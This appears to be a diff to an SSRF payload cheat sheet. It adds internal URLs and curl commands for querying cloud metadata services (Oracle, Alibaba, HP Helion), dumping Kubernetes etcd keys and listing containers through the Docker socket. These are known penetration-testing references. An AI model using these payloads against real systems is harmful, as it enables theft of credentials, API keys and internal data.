@@ -447,9 +447,55 @@ http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/pu
 (header required? unknown)
 
 ```
-
 http://169.254.169.254/openstack
+```
 
+**SSRF URL for HP Helion**
 
+(header required? unknown)
 
+```http
+http://169.254.169.254/2009-04-04/meta-data/
+```
 
+**SSRF URL for Oracle Cloud**
+
+```http
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+```
+
+**SSRF URL for Alibaba**
+
+```http
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+```
+
+**SSRF URL for Kubernetes ETCD**
+
+Can contain API keys and internal ip and ports
+
+```http
+curl -L http://127.0.0.1:2379/version
+curl http://127.0.0.1:2379/v2/keys/?recursive=true
+```
+
+**SSRF URL for Docker**
+
+```http
+http://127.0.0.1:2375/v1.24/containers/json
+Simple example
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
+```
+
+**SSRF URL for Rancher**
+
+```
+curl http://rancher-metadata/<version>/<path>
+```
